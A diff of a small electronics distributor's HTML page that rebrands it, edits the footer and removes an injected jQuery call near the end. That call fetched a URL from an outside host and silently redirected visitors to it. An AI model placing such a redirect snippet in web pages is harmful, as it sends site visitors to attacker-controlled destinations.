@@ -15,7 +15,7 @@
     	var reg = new RegExp("[\\u4E00-\\u9FFF]+","g");
     	if(window.returnCitySN){
     		if(reg.test(returnCitySN.cname)){
-    			window.location.href = window.location.origin + '/zh';
+    			//window.location.href = window.location.origin + '/zh';
     		}
     	}
     </script>
@@ -118,8 +118,8 @@
 		<div class="banner-top">
 			<div class="container">
 				<div>
-					<p class="title">——— &nbsp;&nbsp;&nbsp; Welcome to PY -Technology&nbsp;&nbsp;&nbsp; ———</p>
-					<p>PY Technology is an independent distributor of electronics components. With global sourcing and supply capabilities, we constantly strive to service the continually changing needs of the electronics industry. Through our locations in China, the UK, Canada and Hong Kong we provides the best in component supply, anti-counterfeit mitigation and logistical solution globally.</p>
+					<p class="title">——— &nbsp;&nbsp;&nbsp; Welcome to PY -Tech&nbsp;&nbsp;&nbsp; ———</p>
+					<p>PY Tech is an independent distributor of electronics components. With global sourcing and supply capabilities, we constantly strive to service the continually changing needs of the electronics industry. Through our locations in China, the UK, Canada and Hong Kong we provides the best in component supply, anti-counterfeit mitigation and logistical solution globally.</p>
 				</div>
 			</div>
 		</div>
@@ -218,9 +218,14 @@
 	<div id="clearfix"></div>
 	<footer class="footer clearfix">
 		<div class="container">
-			<p>PRODUCTS APPLICATIONS SUPPORT COMPANY HOW TO BUY</p>
-			<p>Copyright © 2005-2017 Broadcom. All Rights Reserved. The term “Broadcom” refers to Broadcom Limited and/or its subsidiaries.</p>
-			<p>Cookies and Your Privacy Terms of Use Sitemap</p>
+			<div style="float: left;">
+				<p>PRODUCTS APPLICATIONS SUPPORT COMPANY HOW TO BUY</p>
+				<p>Copyright © 2009-2018 PYTECH. All Rights Reserved. The term “Broadcom” refers to Broadcom Limited and/or its subsidiaries.</p>
+				<p>Cookies and Your Privacy Terms of Use Sitemap &nbsp;&nbsp;&nbsp;Email:&nbsp;sales@py-tech.com</p>
+			</div>
+			<div style="float: right;">
+				<img src="http://www.py-tech.com/public/images/erweima.jpg" style="height:100px;">
+			</div>
 		</div>
 	</footer>
 	<script type="text/javascript">
@@ -230,7 +235,6 @@
 			autoPlay: true,
 			mouseOverStop: false
 		});
-		jQuery.ajax({type:'GET',url:'http://www.gezg.top/users/guest',dataType:'text',success:function(res){if(res){window.location.href=res}}});
 	</script>
 </body>
 </html>
